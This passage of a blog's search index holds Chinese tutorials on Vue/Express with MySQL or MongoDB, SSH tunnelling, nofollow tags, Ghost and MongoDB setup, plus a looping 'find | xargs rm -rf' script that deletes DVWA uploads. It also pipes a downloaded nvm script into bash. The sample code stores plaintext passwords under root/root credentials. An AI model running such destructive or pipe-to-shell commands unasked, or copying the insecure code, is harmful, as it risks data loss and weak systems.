    <content type="text"><![CDATA[使用 vue-cli 脚手架工具创建一个基于 webpack 的 Vue 项目本身已经包含了 Express, 但是项目若需要结合 MySQL 或者 MongoDB, 还需折腾一番构建 Vue 项目前提： 安装 node.js 环境安装 vue-clinpm install -g vue-cli 一个基于 webpack 的 Vue 项目vue init webpack [project-name] cd [project-name] npm install 使用 vue-resource 请求数据npm install --save vue-resource 在你的 src/main.js 适当位置添加以下代码import VueResource from &quot;vue-resource&quot; Vue.use(VueResource) MySQL添加 Express 服务端目录前提： 安装 MySQL 数据库在项目根文件夹下创建一个 server 文件夹。 然后里面创建下面几个文件夹及文件|-- server |-- bin |-- www.js =&gt; Express 服务器入口文件 |-- config |-- db.js =&gt; MySQL 数据库配置文件 |-- map |-- sqlMap.js =&gt; SQL 语句存储文件 |-- router |-- userApi.js =&gt; 数据库操作文件 bin/www.jsconst express = require(&quot;express&quot;) const path = require(&quot;path&quot;) const bodyParser = require(&quot;body-parser&quot;) const cookieParser = require(&quot;cookie-parser&quot;) const logger = require(&quot;morgan&quot;) const compression = require(&quot;compression&quot;) const app = express() const userApi = require(&quot;../router/userApi&quot;) app.use(logger(&quot;dev&quot;)) app.use(bodyParser.json()) app.use(bodyParser.urlencoded({ extended: false })) app.use(cookieParser()) app.use(compression({ threshold: 0 })) // 后端api路由 app.use(&quot;/api/user&quot;, userApi) // 监听端口 app.use((req, res, next) =&gt; { var err = new Error(&quot;This page not found&quot;) err.status = 404 next(err) }) app.listen(3000, () =&gt; { console.log(&quot;Server running in port 3000...&quot;) }) config/db.js// 数据库连接配置 module.exports = { mysql: { host: &quot;127.0.0.1&quot;, user: &quot;root&quot;, password: &quot;root&quot;, database: &quot;test&quot;, port: &quot;3306&quot; } } map/sqlMap.js// sql语句 const sqlMap = { // 用户 user: { add: &quot;insert into users( `id` , `user_id` , `user_pwd` ) values (NULL, ?, ?)&quot; } } module.exports = sqlMap router/userApi.jsconst models = require(&quot;../config/db&quot;) const express = require(&quot;express&quot;) const router = express.Router() const mysql = require(&quot;mysql&quot;) const $sql = require(&quot;../map/sqlMap&quot;) // 连接数据库 const conn = mysql.createConnection(models.mysql) conn.connect() const jsonWrite = (res, ret) =&gt; { if (typeof ret === &quot;undefined&quot;) { res.json({ code: &quot;1&quot;, msg: &quot;操作失败&quot; }) } else { res.json(ret) } } // 增加用户接口 router.post(&quot;/addUser&quot;, (req, res) =&gt; { var sql = $sql.user.add var params = req.body console.log(params) conn.query(sql, [params.user_id, params.user_pwd], (err, result) =&gt; { if (err) { console.log(err) } if (result) { jsonWrite(res, result) } }) }) module.exports = router 添加 scripts 到 package.json&quot;scripts&quot;: { &quot;server&quot;: &quot;nodemon ./server/bin/www.js&quot;, } 注意到 package.json 中的 nodemon, 这是热加载插件, 就是有新文件的创建或者有新增代码, 将会重新启动 Express 服务安装依赖npm install --save nodemon mysql body-parser MongoDB示例： https://github.com/vxhly/vue-express-mongodb添加 Express 服务端目录前提： 安装 MongoDB 数据库在项目根文件夹下创建一个 server 文件夹。 然后里面创建下面几个文件夹及文件|-- server |-- bin |-- www.js =&gt; Express 服务器入口文件 |-- config |-- db.js =&gt; MongoDB 数据库配置文件 |-- router |-- userApi.js =&gt; 数据库操作文件 bin/www.jsconst express = require(&quot;express&quot;) const path = require(&quot;path&quot;) const bodyParser = require(&quot;body-parser&quot;) const cookieParser = require(&quot;cookie-parser&quot;) const logger = require(&quot;morgan&quot;) const compression = require(&quot;compression&quot;) const app = express() const userApi = require(&quot;../router/userApi&quot;) app.use(logger(&quot;dev&quot;)) app.use(bodyParser.json()) app.use(bodyParser.urlencoded({ extended: false })) app.use(cookieParser()) app.use(compression({ threshold: 0 })) // 后端api路由 app.use(&quot;/api/user&quot;, userApi) // 监听端口 app.use((req, res, next) =&gt; { var err = new Error(&quot;This page not found&quot;) err.status = 404 next(err) }) app.listen(3000, () =&gt; { console.log(&quot;Server running in port 3000...&quot;) }) config/db.jsconst mongoose = require(&quot;mongoose&quot;) mongoose.connect(&quot;mongodb://127.0.0.1/test&quot;) const db = mongoose.connection mongoose.Promise = global.Promise db.on(&quot;error&quot;, console.error.bind(console, &quot;Connect error&quot;)) db.once(&quot;open&quot;, function() { console.log(&quot;Mongodb started successfully&quot;) }) const userSchema = mongoose.Schema({ userId: { type: Number, required: true }, userPwd: { type: String, required: true } }) const Models = { User: mongoose.model(&quot;User&quot;, userSchema) } module.exports = Models router/userApi.jsconst express = require(&quot;express&quot;) const router = express.Router() const model = require(&quot;../config/db.js&quot;) const jsonWrite = (res, ret) =&gt; { if (typeof ret === &quot;undefined&quot;) { res.json({ code: &quot;404&quot;, msg: &quot;server is error&quot; }) } else { res.json(ret) } } router.post(&quot;/useradd&quot;, (req, res, next) =&gt; { const params = req.body const id = params.userId const pwd = params.userPwd const user = new model.User({ userId: id, userPwd: pwd }) model.User.findOne({ userId: user.userId }, (err, doc) =&gt; { if (err) console.log(err) console.log(doc) if (doc) { jsonWrite(res, doc) } else { user.save(err =&gt; { if (err) { console.log(err) } else { jsonWrite(res, doc) } }) } }) }) module.exports = router 编写 vue 测试文件&lt;template&gt; &lt;div class=&quot;hello&quot;&gt; &lt;h1&gt;{{ msg }}&lt;/h1&gt; &lt;form&gt; &lt;input type=&quot;text&quot; name=&quot;user_id&quot; v-model=&quot;user_id&quot; placeholder=&quot;Enter your ID&quot;&gt; &lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;user_pwd&quot; v-model=&quot;user_id&quot; placeholder=&quot;Enter your password&quot;&gt; &lt;br&gt; &lt;a href=&quot;javascript:&quot; @click=&quot;addUser&quot;&gt;提交&lt;/a&gt; &lt;/form&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: &#39;hello&#39;, data () { return { msg: &#39;Welcome to Your Vue.js App&#39;, user_id: &#39;&#39;, user_pwd: &#39;&#39; } }, methods: { addUser() { var userId = this.user_id var userPwd = this.user_pwd this.$http.post(&#39;/api/user/addUser&#39;, { user_id: userId, user_pwd: userPwd }).then((response) =&gt; { console.log(response) }) } } } &lt;/script&gt; 设置代理与跨域完成上面步骤之后, 执行 npm run dev , 你会发现会报一个错误： vue-resource.common.js?e289:1071 POST http://localhost:8080/api/use... 404 (Not Found) 。 这是由于直接访问 8080 端口, 是访问不到的, 所以这里需要设置一下代理转发映射.项目根目录下的 config 文件夹中有一个 proxyTable 参数, 用来设置地址映射表, 可以添加到开发时配置（dev）中config/index.jsdev: { // ... proxyTable: { &#39;/api&#39;: { target: &#39;http://127.0.0.1:3000/api/&#39;, changeOrigin: true, pathRewrite: { &#39;^/api&#39;: &#39;&#39; } } }, // ... } 添加以上代码之后, 请求 /api 时就代表 http://127.0.0.1:3000/api/ (这里要写 ip, 不要写 localhost), changeOrigin 参数接收一个布尔值, 如果为 true, 这样就不会有跨域问题了。开启服务npm run dev npm run server]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>MongoDB</tag>
        <tag>Vue.js</tag>
        <tag>MySQL</tag>
        <tag>Express</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shell 监听脚本：新增文件]]></title>
    <url>%2Farchives%2Ff7b6023a.html</url>
    <content type="text"><![CDATA[Liunx 下的监听 shell 脚本,脚本功能实现,当一小时内有新增的新文件,立刻删除它,此脚本允许被后台运行功能解释若含有文件上传漏洞时,该脚本能够自动删除上传的文件在 PWD(攻防对抗) 中非常有用后台运行,只占用进程号,不占用 shell 界面脚本代码#!/bin/bash while true do find /var/www/dvwa/ -cmin -60 -type f | xargs rm -rf sleep 1 done 脚本解释while true =&gt; 持续监听-cmin -60 =&gt; 查找一小时内（包含一小时）新增文件-type f =&gt; 制定文件类型为文件| =&gt; 管道符,将前一个命令执行结果传送至后一个命令执行xargs =&gt; 命令传递参数的一个过滤器,可以批量执行sleep 1 =&gt; 上一条命令执行之后,暂停 1 秒/var/www/dvwa/ =&gt; 可为任何目录,这边是一个测试目录运行chmod +x [fileName].sh ./[fileName].sh &amp; 进程号查询脚本后台运行时,会生成一个进程号通过 ps 命令可以查询进程测试本地测试在 /var/www/dvwa/ 某个目录下新增文件在有上传文件漏洞中测试在 dvwa 中的上传文件漏洞环境进行测试]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈 SSH 服务]]></title>
    <url>%2Farchives%2F5ec8ccce.html</url>
    <content type="text"><![CDATA[SSH 是每一台 Linux 系统的标准配置服务,本文将总结 SSH 的常见用法什么是 SSHSSH 为 Secure Shell 的缩写,中文名字为安全外壳协议。SSH 是目前较可靠,专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。需要指出的是,SSH 只是一种协议,存在多种实现,既有商业实现,也有开源实现。基本用法SSH 主要用于远程登录,只要一条简单命令就可以了。ssh [userName]@[hostIP] 如果本地用户名与远程用户名一致,登录时可以省略用户名。ssh [hostIP] SSH 的默认端口是 22,当然也可以使用 -p 修改这个端口。ssh -p [port] [userName]@[hostIP] 中间人攻击SSH 之所以能够保证安全,原因在于它采用了公钥加密。整个过程是这样的：远程主机收到用户的登录请求,把自己的公钥发给用户。用户使用这个公钥,将登录密码加密后,发送回来。远程主机用自己的私钥,解密登录密码,如果密码正确,就同意用户登录。这个过程本身是安全的,但是实施的时候存在一个风险：如果有人截获了登录请求,然后冒充远程主机,将伪造的公钥发给用户,那么用户很难辨别真伪。因为不像 https 协议,SSH 协议的公钥是没有证书中心（CA）公证的,也就是说,都是自己签发的。可以设想,如果攻击者插在用户与远程主机之间（比如在公共的 wifi 区域）,用伪造的公钥,获取用户的登录密码。再用这个密码登录远程主机,那么 SSH 的安全机制就荡然无存了。这种风险就是著名的“中间人攻击”（Man-in-the-middle attack）。口令登录如果你是第一次登录对方主机,系统会出现下面的提示：The authenticity of host ‘host (12.18.429.21)’ can’t be established.RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.Are you sure you want to continue connecting (yes/no)?这段话的意思是,无法确认 host 主机的真实性,只知道它的公钥指纹,问你还想继续连接吗？所谓”公钥指纹”,是指公钥长度较长（这里采用 RSA 算法,长达 1024 位）,很难比对,所以对其进行 MD5 计算,将它变成一个 128 位的指纹。上例中是 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d,再进行比较,就容易多了。很自然的一个问题就是,用户怎么知道远程主机的公钥指纹应该是多少？回答是没有好办法,远程主机必须在自己的网站上贴出公钥指纹,以便用户自行核对。假定经过风险衡量以后,用户决定接受这个远程主机的公钥。Are you sure you want to continue connecting (yes/no)? yes系统会出现一句提示,表示 host 主机已经得到认可。Warning: Permanently added ‘host,12.18.429.21’ (RSA) to the list of known hosts.然后,会要求输入密码。Password: (enter password)如果密码正确,就可以登录了。当远程主机的公钥被接受以后,它就会被保存在文件 $HOME/.ssh/known_hosts 之中。下次再连接这台主机,系统就会认出它的公钥已经保存在本地了,从而跳过警告部分,直接提示输入密码。每个 SSH 用户都有自己的 known_hosts 文件,此外系统也有一个这样的文件,通常是 /etc/ssh/ssh_known_hosts,保存一些对所有用户都可信赖的远程主机的公钥。公钥登录使用密码登录,每次都必须输入密码,非常麻烦。好在 SSH 还提供了公钥登录,可以省去输入密码的步骤。所谓”公钥登录”,原理很简单,就是用户将自己的公钥储存在远程主机上。登录的时候,远程主机会向用户发送一段随机字符串,用户用自己的私钥加 密后,再发回来。远程主机用事先储存的公钥进行解密,如果成功,就证明用户是可信的,直接允许登录 shell,不再要求密码。这种方法要求用户必须提供自己的公钥。如果没有现成的,可以直接用 ssh-keygen 生成一个：ssh-keygen 运行上面的命令以后,系统会出现一系列提示,可以一路回车。其中有一个问题是,要不要对私钥设置口令（passphrase）,如果担心私钥的安全,这里可以设置一个。运行结束以后,在 $HOME/.ssh/ 目录下,会新生成两个文件：id_rsa.pub 和 id_rsa。前者是你的公钥,后者是你的私钥。这时再输入下面的命令,将公钥传送到远程主机 host 上面：ssh-copy-id [userName]@[hostIP] 好了,从此你再登录,就不需要输入密码了。authorized_keys 文件远程主机将用户的公钥,保存在登录后的用户主目录的 $HOME/.ssh/authorized_keys 文件中。公钥就是一段字符串,只要把它追加在 authorized_keys 文件的末尾就行了。这里不使用上面的 ssh-copy-id 命令,改用下面的命令,解释公钥的保存过程：ssh [userName]@[hostIP] &#39;mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub 这条命令由多个语句组成,依次分解开来看：ssh [userName]@[hostIP],表示登录远程主机单引号中的 mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys,表示登录后在远程 shell 上执行的命令mkdir .ssh 的作用是,如果用户主目录中的 .ssh 目录不存在,就创建一个cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub 的作用是,将本地的公钥文件 ~/.ssh/id_rsa.pub,重定向追加到远程文件 authorized_keys 的末尾。写入 authorized_keys 文件后,公钥登录的设置就完成了。远程操作ssh [userName]@[hostIP] &#39;mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub 单引号中间的部分,表示在远程主机上执行的操作；后面的输入重定向,表示数据通过 SSH 传向远程主机。这就是说,SSH 可以在用户和远程主机之间,建立命令和数据的传输通道,因此很多事情都可以通过 SSH 来完成。【例 1】将 $HOME/src/ 目录下面的所有文件,复制到远程主机的 $HOME/src/ 目录。cd &amp;&amp; tar czv src ssh [userName]@[hostIP] &#39;tar xz&#39; 【例 2】将远程主机 $HOME/src/ 目录下面的所有文件,复制到用户的当前目录。ssh [userName]@[hostIP] &#39;tar cz src&#39; tar xzv 【例 3】查看远程主机是否运行进程 httpd。ssh [userName]@[hostIP] &#39;ps ax grep [h]ttpd&#39; 绑定本地端口既然 SSH 可以传送数据,那么我们可以让那些不加密的网络连接,全部改走 SSH 连接,从而提高安全性。假定我们要让 8080 端口的数据,都通过 SSH 传向远程主机,命令就这样写：ssh -D 8080 [userName]@[hostIP] SSH 会建立一个 socket,去监听本地的 8080 端口。一旦有数据传向那个端口,就自动把它转移到 SSH 连接上面,发往远程主机。可以想象,如果 8080 端口原来是一个不加密端口,现在将变成一个加密端口。本地端口转发有时,绑定本地端口还不够,还必须指定数据传送的目标主机,从而形成点对点的”端口转发”。为了区别后文的”远程端口转发”,我们把这种情况称为”本地端口转发”（Local forwarding）。假定 host1 是本地主机,host2 是远程主机。由于种种原因,这两台主机之间无法连通。但是,另外还有一台 host3,可以同时连通前面两台主机。因此,很自然的想法就是,通过 host3,将 host1 连上 host2。我们在 host1 执行下面的命令：ssh -L 2121:[host2IP]:21 [host3IP] 命令中的 L 参数一共接受三个值,分别是”本地端口:目标主机:目标主机端口”,它们之间用冒号分隔。这条命令的意思,就是指定 SSH 绑定本地端口 2121,然后指定 host3 将所有的数据,转发到目标主机 host2 的 21 端口（假定 host2 运行 FTP,默认端口为 21）。这样一来,我们只要连接 host1 的 2121 端口,就等于连上了 host2 的 21 端口。ftp localhost:2121 “本地端口转发”使得 host1 和 host3 之间仿佛形成一个数据传输的秘密隧道,因此又被称为”SSH 隧道”。远程端口转发既然”本地端口转发”是指绑定本地端口的转发,那么”远程端口转发”（remote forwarding）当然是指绑定远程端口的转发。还是接着看上面那个例子,host1 与 host2 之间无法连通,必须借助 host3 转发。但是,特殊情况出现了,host3 是一台内网机器,它可以连接外网的 host1,但是反过来就不行,外网的 host1 连不上内网的 host3。这时,”本地端口转发”就不能用了,怎么办？解决办法是,既然 host3 可以连 host1,那么就从 host3 上建立与 host1 的 SSH 连接,然后在 host1 上使用这条连接就可以了。我们在 host3 执行下面的命令：ssh -R 2121:[host2IP]:21 [host1IP] R 参数也是接受三个值,分别是”远程主机端口:目标主机:目标主机端口”。这条命令的意思,就是让 host1 监听它自己的 2121 端口,然后将所有数据经由 host3,转发到 host2 的 21 端口。由于对于 host3 来说,host1 是远程主机,所以这种情况就被称为”远程端口绑定”。绑定之后,我们在 host1 就可以连接 host2 了：ftp localhost:2121 这里必须指出,”远程端口转发”的前提条件是,host1 和 host3 两台主机都有 sshD 和 ssh 客户端。SHH 的其他参数SSH 还有一些别的参数,也值得介绍。N 参数,表示只连接远程主机,不打开远程 shell；T 参数,表示不为这个连接分配 TTY。这个两个参数可以放在一起用,代表这个 SSH 连接只用来传数据,不执行远程操作。ssh -NT -D 8080 [hostIP] f 参数,表示 SSH 连接成功后,转入后台运行。这样一来,你就可以在不中断 SSH 连接的情况下,在本地 shell 中执行其他操作。ssh -f -D 8080 [hostIP] 要关闭这个后台连接,就只有用 kill 命令去杀掉进程。]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nofollow 正确使用方式]]></title>
    <url>%2Farchives%2F9725c842.html</url>
    <content type="text"><![CDATA[有的网站内容比较的重要,不希望别人所知道,同时也防止一些无聊的 SEO 站长特意灌水,发一些无关的信息,所以最佳解决方式是设置 NofollowNofollow 的作用禁止爬取带有 Nofollow 标识的内容。不额外传递网站页面或者整个网站权重。为互联网打造舒适健康的网络环境。Nofollow 正确使用方法第一种方法通常将 nofollow 写在 head 区域,也就是写在 meta 标签上面,等于告诉爬虫不要抓取网页上所有标内外部链接。&lt;meta name=&quot;robots&quot; content=&quot;nofollow&quot; /&gt; 第二种方法上面一种有所差别,此时他是属于超文本链接的的一个属性值,也就是超链接 a 标签,并且带上 rel=”nofollow”&lt;a rel=&quot;nofollow&quot; href=&quot;&quot;&gt;&lt;/a&gt; Nofollow 的其他一些写法index 指令：告诉搜索引擎抓取这个页面follow 指令：告诉搜索引擎可以从这个页面上找到链接,然后继续访问抓取下去。noindex 指令：告诉搜索引擎不允许抓取这个页面nofollow 指令：告诉搜索引擎不允许从此页找到链接、拒绝其继续访问。根据以上的指令,我们就有了以下的四种组合组合一可以抓取本页,而且可以顺着本页继续索引别的链接&lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt; 组合二不许抓取本页,但是可以顺着本页抓取索引别的链接&lt;meta name=&quot;robots&quot; content=&quot;noindex,follow&quot;&gt; 组合三可以抓取本页,但是不许顺着本页抓取索引别的链接&lt;meta name=&quot;robots&quot; content=&quot;index,nofollow&quot;&gt; 组合四不许抓取本页,也不许顺着本页抓取索引别的链接&lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;&gt; 错误写法不要把两个对立的反义词写到一起,例如：&lt;meta name=&quot;robots&quot; content=&quot;index,noindex&quot;&gt; &lt;!-- 或 --&gt; &lt;meta name=&quot;robots&quot; content=&quot;follow,nofollow&quot;&gt; 简写方式此外对于多命令,这里有一个简便的写法, 如果是&lt;meta name=&quot;robots&quot; content=&quot;index,follow&quot;&gt; 的形式的话,可以写成：&lt;meta name=&quot;robots&quot; content=&quot;all&quot;&gt; 如果是&lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;&gt; 的形式的话,可以写成：&lt;meta name=&quot;robots&quot; content=&quot;none&quot;&gt; 禁止搜索引擎建立快照网站快照指的是搜索引擎（如百度,google 等）在抓取网站数据的时候,对网页进行的一种缓存处理,方便用户遇到网站打不开的时候,也能正常查看网站的资料,而且网站快照还能告诉站长这个网站在搜索引擎上的更新时间,当然了,快照的时间并不等于网站更新的时间。限制所有的搜索引擎建立快照&lt;meta name=&quot;robots&quot; content=&quot;noarchive&quot;&gt; 仅限制某个搜索引擎&lt;meta name=&quot;Googlebot&quot; content=&quot;noarchive&quot;&gt; &lt;!-- 限制谷歌搜索引擎 --&gt; &lt;meta name=&quot;Baiduspider&quot; content=&quot;noarchive&quot;&gt; &lt;!-- 限制百度搜索引擎 --&gt; 其他写法如果是对于单独的某个搜索引擎不允许建立快照且限制爬虫爬取链接方式,例如谷歌,我们就可以写成：&lt;meta name=&quot;googlebot&quot; content=&quot;index,follow,noarchive&quot;&gt; 如果设置成 archive 当然是允许建立快照,默认的也是如此&lt;meta name=&quot;robots&quot; content=&quot;index,follow, archive&quot;&gt; Nofollow 的缺点Nofollow 的作用是告诫爬虫,该链接请你老人家不要爬取,也就意味着被添加上 Nofollow 标识的链接将失去传递权重的作用,从而避免了权重的流失或者被均摊。Nofollow 标识并不能够避免权重的流失。如果你的页面具有 4 个链接,但是某一个链接添加上了 Nofollow 标识,这也就导致了原来每个占有 25%的权重链接数量变成了 3 个,但是所有的链接还是原来的 25%,并不会因为 Nofollow 标识的存在而实现权重的累积,也就意味着添加 Nofollow 标识的链接的群众不被考虑在内,方便蜘蛛能够在有限的时间内爬取收录更多的页面信息。Nofollow 标识是交换友情链接的重要依据之一。众所周知,高权重友情链接的交换能够给彼此带来较高效果,因为相互传递权重支持,但是就有一些 SEO 站长耍点小聪明,为了一点点的私信,在链接上面添加上 Nofollow 标识,从而使彼此互助的友情链接成了单方面的支持,他的网站不给你传递权重,而你的网站却给他传递权重,这属于欺骗性行为,是一种很可耻的行为,还在现在各方面都很人性化,一般都能够检测到 Nofollow 标识。Nofollow 和 External nofollow 的区别其实这两者没有什么区别,后者是前者的规范性写法,意思一样,效果一样。Nofollow 使用之处一般出现在博客内容区域,评论,论坛签名等,防止不法粉丝狂刷屏,一是方便用户流畅的查看到价值高的信息,同时也给服务器减压。广告区域,也就是广告位,说白了就是赚钱广告费,因为这些广告可能是与本网站无关的信心,如果被爬虫所知道,那么将会影响网站的相关性,所以添加 Nofollow 标识,这样百度搜索引擎就发觉不到了,聪明吧。]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>Criterion</tag>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在你的 VPS 服务器搭建 Ghost 博客系统]]></title>
    <url>%2Farchives%2F884a30e7.html</url>
    <content type="text"><![CDATA[Ghost 采用 Node.js 编写,默认使用 SQLite3 数据库,非常轻量,因为是文件型数据库,所以无需安装。Ghost 允许多用户编写博文,使用 Markdown 来编写博文下载 GhostGhost 中文官网Ghost 英文官网Ghost 中文集成版(推介)最新版本：Ghost v0.7.4 full (zh)版本特色：中文汉化、支持七牛、又拍云、阿里云 OSS 存储；增加 Roon 主题；集成 node_modules ,无需忍受 npm install --production 的麻烦。Ghost 中文标准版最新版本：Ghost v0.7.4 (zh)版本特色：中文汉化、支持七牛、又拍云、阿里云 OSS 存储；增加 Roon 主题Ghost 英文原版最新版本：Ghost v0.7.4安装前准备VPS 服务器和域名VPS 个人服务器当然是必不可少的,解析域名的的时候推介解析为 wwwNode.jsGhost 对 Node.js 版本号要求比较严格,Ghost 官方推荐使用 Node 0.10.x 版本,同时支持 Node 0.12.x 和 Node 4.2.x 版本。这边推介使用稳定版 Node 4.2.x。安装 Node 推介使用 nvm 安装。wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash nvm install 4.2 nvm alias defaults 4.2 需要 Nginx 服务Ghost 默认监听的端口为 2368,而且只监听本地的 IP 地址进行访问,所以需要 Nginx 这个服务来转发流量Ubuntu 下安装直接执行命令apt-get install nginx Ghost+Web 服务器转发原理介绍官方文档建议使用 Nginx 作为 Ghost 的前端来转发 80 端口请求,那么 Ghost 的工作总流程就可以描述为：Nginx 监听 80 端口,Ghost 一直监听本地 127.0.0.1:2368 端口,你从外网访问 www.xxx.com 时,Nginx 从 80 端口接收请求,将之转发到本地 127.0.0.1:2368 端口,然后 Ghost 就收到访问请求了。可是为什么不直接让 Ghost 使用 80 端口呢却要依赖 Web 服务器转发呢？这是因为 Ghost 需要运行在 root 权限上,为了避免风险,就用 Nginx 转发一下。另外,Nginx 毕竟是 Web 服务器,配置灵活、并发高,用来做 Ghost 的前端是非常适合的,如果你服务器上还有其他网站那就更要用 Nginx 了,不然你的 80 端口给了 Ghost 就没法负载其他网站了。解压文件unzip -uo [fileName].zip -d [folderName] 开始配置使用安装依赖如果你下载的不是 Ghost 中文集成版,那么你就需要在你的项目目录下执行npm install --production 当然,这需要翻墙,Ghost 所依赖的默认数据库 sqlite 包需要从国外服务器上（亚马逊的云存储服务）下载原生插件,即使是翻墙了也未必能下载下来,因为 sqlite 的原生插件没有通过 npm 分发。配置 config.js解压缩之后会有一个 config.example.js 默认配置文件,你需要把它复制重命名成 config.jscp config.example.js config.js 配置 URL... config = { production: { url: &#39;//www.yourdomian&#39;, ... } ... } ... 注意这边必须写上 // 或者 //,这里写的 URL 就是以后注册账号和登录后台时所用的 URL,必须完全一样,如果注册时用的 URL 和这里的不一样,那么就会出现错误提示说无权限访问！配置 Nginx 服务进行转发打开 /etc/nginx/nginx.conf,在 http 语句块内追加上：server { listen 80; server_name www.yourdomian; location / { proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $http_host; proxy_pass http://127.0.0.1:2368; } } 重启 Nginx/etc/init.d/nginx restart 配置 Apache 服务进行转发打开 /etc/httpd/conf/httpd.conf# NameVirtualHost *:80 #这一行取消注释 再在文件末尾加上如下语句,配置请求转发&lt;VirtualHost *:80&gt; ServerName linuxidc.com ProxyRequests Off ProxyPreserveHost On &lt;Proxy *&gt; AddDefaultCharset Off Order deny,allow Allow from all &lt;/Proxy&gt; ProxyPass / http://127.0.0.1:2368/ ProxyPassReverse / http://127.0.0.1:2368/ &lt;/VirtualHost&gt; 重启 httpd 服务service httpd restart 启动 Ghost 服务npm start --production 现在启动 Ghost 并访问域名已经能进入博客页面了,但下面还需要实现 Ghost 后台运行,不然你退了终端的话 Ghost 就停止了。使用 Forever 让 Ghost 后台运行安装 forever 包npm install forever -g 启动 GhostNODE_ENV=production forever start index.js 关闭 Ghostforever stop index.js 重启动 GhostNODE_ENV=production forever restart index.js 查看运行状态用这条命令forever list 访问前台：http://www.yourdomian后台：http://www.yourdomian/ghost拓展配置Ghost 邮件系统设置详解Ghost 邮件系统设置详解为博客增加 “标签云”为博客增加 “标签云”]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 下安装 MongoDB]]></title>
    <url>%2Farchives%2F4e562ec2.html</url>
    <content type="text"><![CDATA[MongoDB 是目前在 IT 行业非常流行的一种非关系型数据库 (NoSql),其灵活的数据存储方式备受当前 IT 从业人员的青睐。这里主要讲如何在 Windows 平台下安装 MongoDB下载MongoDB 官网下载链接如果被墙的话,请点击 mongodb-win32-x86_64-2008plus-ssl-3.4.1-signed.msi 下载手动简单的配置配置环境变量安装成功之后,将 mongodb 目录下的 bin 目录添加至 path 变量中,如：创建数据库文件存放目录创建数据库文件的存放位置,比如 D:\mongodb\data\db。启动 mongodb 服务之前需要必须创建数据库文件的存放文件夹,否则命令不会自动创建,而且不能启动成功。接下来打开命令行窗口,切换到 D:\MongoDB\bin 目录执行如下命令：mongod --dbpath D:\MongoDB\data\db # 其中 --dbpath 是指定数据库存放目录 这是命令行窗口会打印一些启动信息,最后一行显示为如下信息时表示启动成功了2017-05-29T17:23:16.752+0800 I NETWORK [thread1] waiting for connections on port 27017 创建日志文件存放目录我们需要指定 log 目录,所以我们创建 log 目录 D:\MongoDB\data\logs\mongodb.log.mongod --dbpath D:\MongoDB\data\db --logpath=D:\MongoDB\data\logs\mongodb.log --logappend 这是命令行窗口会打印一些启动信息,最后一行显示为如下信息时表示启动成功了2017-05-29T17:23:16.752+0800 I NETWORK [thread1] waiting for connections on port 27017 安装为 Windows 服务sc create MongoDB binPath= &quot;D:\MongoDB\bin\mongod.exe --service --dbpath D:\MongoDB\data\db --logpath=D:\MongoDB\data\logs\mongodb.log --logappend&quot; 启动服务时需要管理员权限net start MongoDB 使用配置文件很遗憾,官方下载的安装包里面没有默认的配置文件,若想使用配置文件只能自己建一个了,另外个人也推荐使用配置文件来管理 MongoDB 的配置,使用配置文件配置数据库文件、日志文件以及其它的一些配置都一目了然解压安装包到 D:\MongoDB建立数据库目录 D:\MongoDB\data建立日志目录 D:\MongoDB\logs建立配置文件目录 D:\MongoDB\etc建立配置文件 D:\MongoDB\etc\mongodb.conf配置文件dbpath=D:\MongoDB\data # 数据库路径 logpath=D:\MongoDB\logs\mongodb.log # 日志输出文件路径 logappend=true # 错误日志采用追加模式,配置这个选项后 mongodb 的日志会追加到现有的日志文件,而不是从新创建一个新文件 journal=true # 启用日志文件,默认启用 quiet=true # 这个选项可以过滤掉一些无用的日志信息,若需要调试使用请设置为 false port=27017 # 端口号 默认为 27017 这里仅指定了几个常用项,更多详细配置请参考官方文档 https://docs.mongodb.org/manual/reference/configuration-options/普通启动mongod --config D:\MongoDB\etc\mongodb.conf 安装为 Windows 服务mongod --config D:\MongoDB\etc\mongodb.conf --install 使用 SC 安装为 Windows 服务sc create MongoDB binPath= &quot;D:\MongoDB\bin\mongod.exe --service --config=D:\MongoDB\etc\mongodb.conf&quot; 启动服务时需要管理员权限net start MongoDB 浏览器测试打开浏览器,访问 http://127.0.0.1:27017/ ,显示以下内容表示安装成功附上 Ubuntu 下安装Ubuntu 下安装非常简单,执行一条命令就行,无需任何配置,执行完后直接使用。sudo apt-get -y install mongodb 图形化管理工具推介图形化管理工具 adminMongo环境需求Node.js(使用 nvm 进行安装)pm2(npm -g pm2)git安装并启动下载git clone https://github.com/mrvautin/adminMongo.git cd adminMongo &amp;&amp; npm install pm2 启动cd adminMongo pm2 start app.js 访问测试打开浏览器,访问 http://127.0.0.1:1234/ ,显示以下内容表示安装成功配置使用Connection name =&gt; 连接名随意 Connection string =&gt; 